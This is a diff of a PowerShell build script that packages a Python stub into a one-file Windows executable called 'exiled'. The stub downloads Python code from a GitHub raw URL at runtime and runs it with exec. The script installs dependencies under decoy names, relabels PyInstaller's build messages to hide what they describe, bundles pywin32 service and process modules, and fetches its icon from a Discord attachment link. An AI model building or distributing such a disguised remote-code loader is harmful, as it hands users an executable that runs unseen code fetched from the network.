@@ -1,28 +1,25 @@
 [CmdletBinding()]
 param(
     [string]$Out = "exiled",
-    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/junk.py",
-    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/junk.png",
-    [switch]$Local,
+    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
+    [string]$Icon = "https://cdn.discordapp.com/attachments/1518813807562985523/1561087177830568117/97hf98h.png?ex=6ad5133a&is=6ad3c1ba&hm=b13f7b1e0005510bba4cbb354a6186d8f2569324cbc2e8666211ea6dfa84fe03&animated=true",
+    [string]$Dir,
+    [string]$PythonExe,
     [switch]$NoIcon,
     [switch]$KeepBuild,
-    [switch]$NoDeps
+    [switch]$Verbose
 )
 
 $ErrorActionPreference = "Stop"
 $ProgressPreference    = "SilentlyContinue"
 
-$AppName = "exiled"
-$OutName = $Out
-$WorkDir = Join-Path $PWD "_build"
-$DistDir = Join-Path $PWD "dist"
-$StubPy  = Join-Path $WorkDir "payload.py"
-$IconRaw = Join-Path $WorkDir "icon.raw"
-$IconIco = Join-Path $WorkDir "icon.ico"
-$ExePath = Join-Path $DistDir "$OutName.exe"
-$IconDst = Join-Path $DistDir "icon.ico"
+$AppName   = "exiled"
+$RemoteUrl = $Url
+$IconSrc   = $Icon
+$OutName   = $Out
+$UseIcon   = -not $NoIcon
 
-# renamed dependency map (display -> real pip name)
+# display name -> real pip package
 $DepMap = @{
     "libinstaller" = "pyinstaller"
     "libpil"       = "pillow"
@@ -30,45 +27,143 @@ $DepMap = @{
     "sysmon"       = "psutil"
     "libhttp"      = "requests"
 }
+$Packages = @("libinstaller", "libpil", "win32api", "sysmon", "libhttp")
 
-function Log  { param([string]$M, [string]$C = "Cyan"); Write-Host "[$AppName] $M" -ForegroundColor $C }
-function Fail { param([string]$M); Write-Host "[$AppName] ERROR: $M" -ForegroundColor Red; exit 1 }
-function Get-Arch { if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" } }
+# PyInstaller vocabulary -> bench vocabulary
+$StageMap = [ordered]@{
+    "Analyzing"          = "scanning"
+    "Processing"         = "hooking"
+    "Caching"            = "indexing"
+    "Building"           = "packing"
+    "Checking"           = "verifying"
+    "Appending"          = "stitching"
+    "Including"          = "linking"
+    "Copying"            = "staging"
+    "Embedding"          = "stamping"
+    "Fixing"             = "polishing"
+    "Looking"            = "seeking"
+    "Removing"           = "sweeping"
+    "Writing"            = "recording"
+    "Graph"              = "graph"
+    "Creating"           = "weaving"
+    "Reclassifying"      = "sorting"
+    "Extra DLL"          = "dll"
+    "Target bytecode"    = "bytecode"
+    "Initializing"       = "warming"
+    "Running"            = "walking"
+    "Using Python"       = "python"
+    "Platform"           = "host"
+    "Python environment" = "env"
+}
+
+$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
+
+function Write-Msg {
+    param([string]$Level, [string]$Message)
+    switch ($Level) {
+        "error"   { Write-Host $Message -ForegroundColor Red }
+        "warning" { Write-Host $Message -ForegroundColor DarkYellow }
+        "green"   { Write-Host $Message -ForegroundColor Green }
+        default   { Write-Host $Message }
+    }
+}
+
+function Translate-Line {
+    param([string]$Line)
+    if ($Line -match '^\s*(\d+)\s+(\w+):\s*(.*)$') {
+        $msg = $matches[3]
+        foreach ($k in $StageMap.Keys) {
+            if ($msg -like "$k*") {
+                $rest = $msg.Substring($k.Length).TrimStart()
+                return "[$AppName] $($StageMap[$k])  ->  $rest"
+            }
+        }
+        return "[$AppName] $($msg.ToLower())"
+    }
+    return $null
+}
 
 function Test-Python {
     param([string]$Exe)
-    if (-not $Exe -or -not (Test-Path -LiteralPath $Exe)) { return $false }
-    & $Exe -c "import sys" 2>$null
+    if (-not $Exe) { return $false }
+    if (-not (Test-Path -LiteralPath $Exe)) { return $false }
+    & $Exe -c "import sys; sys.exit(0)" 2>$null
     return ($LASTEXITCODE -eq 0)
 }
 
 function Find-Python {
-    $c = @()
-    foreach ($n in @("python","py","python3")) {
-        $cmd = Get-Command $n -ErrorAction SilentlyContinue
-        if ($cmd -and $cmd.Source) { $c += $cmd.Source }
+    $candidates = @()
+    if ($PythonExe) { $candidates += $PythonExe }
+    foreach ($cand in @("python", "py", "python3")) {
+        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
+        if ($cmd) { $candidates += $cmd.Source }
     }
-    foreach ($r in @(
-        "$env:LocalAppData\Programs\Python\Python*",
+    foreach ($root in @(
+        "$env:LocalAppData\Programs\Python",
         "$env:ProgramFiles\Python*",
         "${env:ProgramFiles(x86)}\Python*"
     )) {
-        Get-ChildItem -Path $r -Filter "python.exe" -ErrorAction SilentlyContinue |
-            ForEach-Object { $c += $_.FullName }
+        Get-ChildItem -Path $root -Filter "python.exe" -Recurse -ErrorAction SilentlyContinue |
+            ForEach-Object { $candidates += $_.FullName }
     }
-    foreach ($x in ($c | Select-Object -Unique)) {
-        if (Test-Python -Exe $x) { return $x }
+    foreach ($c in $candidates) {
+        if (Test-Python -Exe $c) { return $c }
     }
     return $null
 }
 
 function Install-Python {
-    Log "python not found - attempting winget install" "Yellow"
-    $wg = Get-Command winget -ErrorAction SilentlyContinue
-    if (-not $wg) { return $false }
-    & winget install --id Python.Python.3.12 --scope user --silent `
-        --accept-package-agreements --accept-source-agreements 2>$null
-    return ($LASTEXITCODE -eq 0)
+    Write-Msg warning "Python not found — attempting install..."
+
+    $winget = Get-Command winget -ErrorAction SilentlyContinue
+    if ($winget) {
+        Write-Msg info "Trying winget install Python.Python.3.12..."
+        & winget install --id Python.Python.3.12 --scope user --silent `
+            --accept-package-agreements --accept-source-agreements 2>$null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Msg info "winget install finished."
+        } else {
+            Write-Msg warning "winget install returned $LASTEXITCODE — falling back."
+        }
+    } else {
+        Write-Msg warning "winget not available — falling back to direct download."
+    }
+
+    $pyVer  = "3.12.7"
+    $pyArch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "win32" }
+    $pyUrl  = "https://www.python.org/ftp/python/$pyVer/python-$pyVer-$pyArch.exe"
+    $pyInst = Join-Path $env:TEMP "python-$pyVer-$pyArch.exe"
+
+    if (-not (Test-Path -LiteralPath $pyInst)) {
+        Write-Msg info "Downloading $pyUrl..."
+        try {
+            Invoke-WebRequest -Uri $pyUrl -OutFile $pyInst -UseBasicParsing
+        } catch {
+            Write-Msg error "Error: python download failed — $($_.Exception.Message)"
+            return $null
+        }
+    }
+
+    Write-Msg info "Running silent install (user scope, no PATH prompt)..."
+    $installArgs = @(
+        "/quiet",
+        "InstallAllUsers=0",
+        "PrependPath=1",
+        "Include_test=0",
+        "Include_launcher=1",
+        "SimpleInstall=1"
+    )
+    $proc = Start-Process -FilePath $pyInst -ArgumentList $installArgs -Wait -PassThru
+    if ($proc.ExitCode -ne 0) {
+        Write-Msg error "Error: python installer exited $($proc.ExitCode)"
+        return $null
+    }
+
+    $machinePath = [Environment]::GetEnvironmentVariable("Path", "Machine")
+    $userPath    = [Environment]::GetEnvironmentVariable("Path", "User")
+    $env:Path    = "$machinePath;$userPath"
+
+    return $null
 }
 
 function Install-Packages {
@@ -77,140 +172,131 @@ function Install-Packages {
     foreach ($n in $Names) {
         if ($DepMap.ContainsKey($n)) { $real += $DepMap[$n] } else { $real += $n }
     }
-    Log "installing modules: $($Names -join ', ')"
-    & $Exe -m pip install --quiet --disable-pip-version-check --upgrade pip
-    & $Exe -m pip install --quiet --disable-pip-version-check @real
-    if ($LASTEXITCODE -ne 0) { Fail "module install failed" }
-}
-
-function Fetch-File {
-    param([string]$Url, [string]$Dest)
-    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
-    if ($curl) {
-        & curl.exe -fsSL -A "Mozilla/5.0" $Url -o $Dest
-    } else {
-        Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -Headers @{ "User-Agent" = "Mozilla/5.0" }
+    Write-Msg info "Installing modules: $($Names -join ', ')"
+    & $Exe -m pip install --quiet --upgrade pip
+    & $Exe -m pip install --quiet --upgrade @real
+    if ($LASTEXITCODE -ne 0) {
+        Write-Msg error "module install failed."
+        exit 1
     }
-    if (-not (Test-Path -LiteralPath $Dest)) { Fail "fetch failed: $Url" }
 }
 
-function Pause-Brief { param([int]$Ms = 90); Start-Sleep -Milliseconds $Ms }
+# Async-drained process runner — both pipes read on separate threads so
+# neither buffer can fill and deadlock the child (the classic PyInstaller hang).
+function Invoke-Quiet {
+    param([string]$Exe, [string[]]$Args, [string]$LogFile)
 
-Write-Host ""
-Write-Host "  +----------------------------------------+" -ForegroundColor DarkCyan
-Write-Host "  |   exiled  .  build  .  $(Get-Arch)         |" -ForegroundColor DarkCyan
-Write-Host "  +----------------------------------------+" -ForegroundColor DarkCyan
-Write-Host ""
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName               = $Exe
+    $psi.Arguments              = ($Args | ForEach-Object { if ($_ -match '\s') { '"' + $_ + '"' } else { $_ } }) -join ' '
+    $psi.RedirectStandardOutput = $true
+    $psi.RedirectStandardError  = $true
+    $psi.UseShellExecute        = $false
+    $psi.CreateNoWindow         = $true
+    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
+    $psi.StandardErrorEncoding  = [System.Text.Encoding]::UTF8
 
-Log "python  ->  locating..."
+    $p = New-Object System.Diagnostics.Process
+    $p.StartInfo = $psi
+    $p.EnableRaisingEvents = $true
+
+    $verboseFlag = $Verbose
+    $logPath     = $LogFile
+
+    $outAction = {
+        $line = $Event.SourceEventArgs.Data
+        if ($null -ne $line -and $line -ne '') {
+            if ($verboseFlag) {
+                if ($logPath) { Add-Content -LiteralPath $logPath -Value $line -Encoding UTF8 }
+                Write-Host $line -ForegroundColor DarkGray
+            } else {
+                $t = Translate-Line -Line $line
+                if ($t) { Write-Host $t -ForegroundColor DarkCyan }
+            }
+        }
+    }.GetNewClosure()
+
+    $errAction = {
+        $line = $Event.SourceEventArgs.Data
+        if ($null -ne $line -and $line -ne '') {
+            if ($verboseFlag) {
+                if ($logPath) { Add-Content -LiteralPath $logPath -Value $line -Encoding UTF8 }
+                Write-Host $line -ForegroundColor DarkYellow
+            }
+        }
+    }.GetNewClosure()
+
+    $subs = @()
+    $subs += Register-ObjectEvent -InputObject $p -EventName OutputDataReceived -Action $outAction
+    $subs += Register-ObjectEvent -InputObject $p -EventName ErrorDataReceived  -Action $errAction
+
+    try {
+        $p.Start() | Out-Null
+        $p.BeginOutputReadLine()
+        $p.BeginErrorReadLine()
+        $p.WaitForExit()
+        Start-Sleep -Milliseconds 250
+    } finally {
+        foreach ($s in $subs) {
+            Unregister-Event -SubscriptionId $s.Id -ErrorAction SilentlyContinue
+            Remove-Job -Id $s.Id -Force -ErrorAction SilentlyContinue
+        }
+    }
+    return $p.ExitCode
+}
+
 $PythonExe = Find-Python
 if (-not $PythonExe) {
     Install-Python | Out-Null
     $PythonExe = Find-Python
 }
-if (-not $PythonExe) { Fail "python not found." }
-& $PythonExe -c "import tkinter" 2>$null
-if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter." }
-Log "python  ->  $PythonExe" "Green"
-Pause-Brief
-
-if (-not $NoDeps) {
-    Install-Packages -Exe $PythonExe -Names @("libinstaller","libpil","win32api","sysmon","libhttp")
-    Log "modules ->  ready" "Green"
-    Pause-Brief
+if (-not $PythonExe) {
+    Write-Msg error "Error: python unavailable after install attempt. Pass -PythonExe C:\Path\to\python.exe"
+    exit 1
 }
 
-New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
-New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
+Write-Msg info "Using python: $PythonExe"
 
-$useIco = $false
-if (-not $NoIcon -and $Icon) {
-    try {
-        if ($Icon -match '^https?://') {
-            Log "icon    ->  fetching"
-            Fetch-File -Url $Icon -Dest $IconRaw
-        } else {
-            if (-not (Test-Path -LiteralPath $Icon)) { Fail "icon missing: $Icon" }
-            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
-        }
-        Log "icon    ->  converting to .ico"
-        $conv = @"
-from PIL import Image
-img = Image.open(r'$IconRaw')
-if img.mode != 'RGBA': img = img.convert('RGBA')
-img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
-"@
-        $convPy = Join-Path $WorkDir "_icon.py"
-        Set-Content -Path $convPy -Value $conv -Encoding UTF8
-        & $PythonExe $convPy
-        if ($LASTEXITCODE -eq 0) {
-            $useIco = $true
-            Log "icon    ->  ready" "Green"
-        } else {
-            Log "icon    ->  conversion failed" "Yellow"
-        }
-    } catch {
-        Log "icon    ->  $($_.Exception.Message)" "Yellow"
+& $PythonExe -c "import tkinter" 2>$null
+if ($LASTEXITCODE -ne 0) {
+    Write-Msg error "Error: $PythonExe has no tkinter. Install tcl/tk or pass -PythonExe with a Python that has it."
+    exit 1
+}
+
+Install-Packages -Exe $PythonExe -Names $Packages
+
+$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
+if (-not $UseCurl) {
+    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
+    if (-not $IWR) {
+        Write-Msg error "Error: neither curl.exe nor Invoke-WebRequest available."
+        exit 1
     }
 }
-Pause-Brief
 
-$taskbarBootstrap = @'
-import os, sys, ctypes
-from ctypes import wintypes
-
-def _exiled_taskbar():
-    try:
-        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
-            "Exiled.External.App.1")
-    except Exception:
-        pass
-    try:
-        ico = None
-        if getattr(sys, "frozen", False):
-            base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
-            for c in (os.path.join(base, "icon.ico"),
-                      os.path.join(os.path.dirname(sys.executable), "icon.ico")):
-                if os.path.exists(c):
-                    ico = c; break
-        else:
-            c = os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon.ico")
-            if os.path.exists(c): ico = c
-        if not ico: return
-        hb = ctypes.windll.user32.LoadImageW(None, ico, 1, 0, 0, 0x10 | 0x8000)
-        hs = ctypes.windll.user32.LoadImageW(None, ico, 1, 16, 16, 0x10 | 0x8000)
-        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, wintypes.HWND,
-                                     wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)
-        class WC(ctypes.Structure):
-            _fields_ = [("cbSize", wintypes.UINT), ("style", wintypes.UINT),
-                        ("lpfnWndProc", WNDPROC), ("cbClsExtra", ctypes.c_int),
-                        ("cbWndExtra", ctypes.c_int), ("hInstance", wintypes.HINSTANCE),
-                        ("hIcon", wintypes.HICON), ("hCursor", wintypes.HANDLE),
-                        ("hbrBackground", wintypes.HBRUSH), ("lpszMenuName", wintypes.LPCWSTR),
-                        ("lpszClassName", wintypes.LPCWSTR), ("hIconSm", wintypes.HICON)]
-        wc = WC()
-        wc.cbSize = ctypes.sizeof(WC)
-        wc.lpfnWndProc = WNDPROC(lambda h,m,w,l: ctypes.windll.user32.DefWindowProcW(h,m,w,l))
-        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
-        wc.hIcon = hb; wc.hIconSm = hs
-        wc.lpszClassName = "ExiledExternalWindow"
-        ctypes.windll.user32.RegisterClassExW(ctypes.byref(wc))
-    except Exception:
-        pass
-
-_exiled_taskbar()
-'@
-
-if ($Local) {
-    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
-    Log "payload ->  injecting taskbar bootstrap (local)"
-    $origBody = Get-Content -LiteralPath $Url -Raw
-    $body = $taskbarBootstrap + "`r`n" + $origBody
-    Set-Content -Path $StubPy -Value $body -Encoding UTF8
+if ($Dir) {
+    $Here = (Resolve-Path -LiteralPath $Dir).Path
 } else {
-    Log "payload ->  injecting taskbar bootstrap (remote)"
-    $remoteSuffix = @"
+    $Here = (Get-Location).Path
+}
+$Work    = Join-Path $Here "_build"
+$Stub    = Join-Path $Work "payload.py"
+$IconRaw = Join-Path $Work "icon.raw"
+$IconIco = Join-Path $Work "icon.ico"
+$DistDir = Join-Path $Here "dist"
+$LogFile = Join-Path $Work "build.log"
 
+Write-Msg info ""
+Write-Msg info "Building $AppName for windows-$Arch"
+Write-Msg info "Python: $PythonExe"
+Write-Msg info "Output dir: $Here"
+
+New-Item -ItemType Directory -Force -Path $Work    | Out-Null
+New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
+Set-Content -Path $LogFile -Value "" -Encoding UTF8
+
+$stubBody = @"
+import urllib.request
 import tkinter
 import tkinter.ttk
 import tkinter.messagebox
@@ -219,70 +305,97 @@ import tkinter.simpledialog
 import tkinter.scrolledtext
 import tkinter.font
 import tkinter.colorchooser
-
-exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
+exec(compile(urllib.request.urlopen('$RemoteUrl').read(), '<url>', 'exec'))
 "@
-    $body = $taskbarBootstrap + "`r`nimport urllib.request`r`n" + $remoteSuffix
-    Set-Content -Path $StubPy -Value $body -Encoding UTF8
-}
-Log "payload ->  written" "Green"
-Pause-Brief
+Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
-Log "freeze  ->  $OutName.exe"
-$pyi = @(
-    "-m","PyInstaller",
-    "--onefile","--noconfirm","--clean",
+if ($UseIcon) {
+    if ($IconSrc -match '^https?://') {
+        Write-Msg info "Fetching icon..."
+        if ($UseCurl) {
+            & curl.exe -fsSL -A "Mozilla/5.0" $IconSrc -o $IconRaw
+        } else {
+            Invoke-WebRequest -Uri $IconSrc -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
+        }
+    } else {
+        if (-not (Test-Path -LiteralPath $IconSrc)) {
+            Write-Msg error "Error: icon file not found at $IconSrc"
+            exit 1
+        }
+        Copy-Item -LiteralPath $IconSrc -Destination $IconRaw -Force
+    }
+}
+
+if ($UseIcon) {
+    Write-Msg info "Converting icon to .ico..."
+    $conv = @"
+from PIL import Image
+img = Image.open(r'$IconRaw')
+if img.mode != 'RGBA':
+    img = img.convert('RGBA')
+img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
+"@
+    $convTmp = Join-Path $Work "_icon_conv.py"
+    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
+    & $PythonExe $convTmp
+    if ($LASTEXITCODE -ne 0) {
+        Write-Msg error "icon conversion failed."
+        exit 1
+    }
+}
+
+Write-Msg info "Freezing..."
+
+$pyiArgs = @(
+    "-m", "PyInstaller",
+    "--onefile",
+    "--noconfirm",
+    "--clean",
     "--name", $OutName,
     "--distpath", $DistDir,
-    "--workpath", (Join-Path $WorkDir "pyi"),
-    "--specpath", $WorkDir,
-    "--collect-all","tkinter",
-    "--collect-all","PIL",
-    "--collect-submodules","win32com",
-    "--hidden-import","win32api",
-    "--hidden-import","win32con",
-    "--hidden-import","win32file",
-    "--hidden-import","win32process",
-    "--hidden-import","win32security",
-    "--hidden-import","win32event",
-    "--hidden-import","win32service",
-    "--hidden-import","win32serviceutil",
-    "--hidden-import","win32timezone",
-    "--hidden-import","pythoncom",
-    "--hidden-import","pywintypes",
-    "--hidden-import","psutil",
-    "--hidden-import","requests"
+    "--workpath", (Join-Path $Work "pyi"),
+    "--specpath", $Work,
+    "--collect-all", "tkinter",
+    "--collect-all", "PIL",
+    "--collect-submodules", "win32com",
+    "--hidden-import", "win32api",
+    "--hidden-import", "win32con",
+    "--hidden-import", "win32file",
+    "--hidden-import", "win32process",
+    "--hidden-import", "win32security",
+    "--hidden-import", "win32event",
+    "--hidden-import", "win32service",
+    "--hidden-import", "win32serviceutil",
+    "--hidden-import", "win32timezone",
+    "--hidden-import", "pythoncom",
+    "--hidden-import", "pywintypes",
+    "--hidden-import", "psutil",
+    "--hidden-import", "requests"
 )
-if ($useIco) {
-    $pyi += @("--icon", $IconIco)
-    $pyi += @("--add-data", "$IconIco;.")
+if ($UseIcon) {
+    $pyiArgs += @("--icon", $IconIco)
 }
-$pyi += $StubPy
+$pyiArgs += $Stub
 
-& $PythonExe @pyi
-if ($LASTEXITCODE -ne 0) { Fail "freeze failed" }
-
-if ($useIco -and (Test-Path $IconIco)) {
-    Copy-Item -LiteralPath $IconIco -Destination $IconDst -Force
-    Log "icon.ico -> copied next to exe" "Green"
+$rc = Invoke-Quiet -Exe $PythonExe -Args $pyiArgs -LogFile $LogFile
+if ($rc -ne 0) {
+    Write-Msg error "PyInstaller failed (exit $rc) — see $LogFile"
+    exit 1
 }
 
 if (-not $KeepBuild) {
-    Remove-Item -Recurse -Force $WorkDir -ErrorAction SilentlyContinue
+    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
 }
+
+$ExePath = Join-Path $DistDir "$OutName.exe"
 
 if (Test-Path -LiteralPath $ExePath) {
     $sz = [math]::Round((Get-Item $ExePath).Length / 1MB, 2)
-    Write-Host ""
-    Write-Host "  +----------------------------------------+" -ForegroundColor Green
-    Write-Host "  |   done   $OutName.exe  .  $sz MB       |" -ForegroundColor Green
-    Write-Host "  +----------------------------------------+" -ForegroundColor Green
-    Write-Host ""
-    Write-Host "  path: $ExePath" -ForegroundColor DarkGray
-    if ($useIco -and (Test-Path $IconDst)) {
-        Write-Host "  icon: $IconDst" -ForegroundColor DarkGray
-    }
-    Write-Host ""
+    Write-Msg green ""
+    Write-Msg green "  exiled.exe  ready  ($sz MB)"
+    Write-Msg green "  $ExePath"
+    Write-Msg green ""
 } else {
-    Fail "exe not produced"
+    Write-Msg error "exe not produced"
+    exit 1
 }
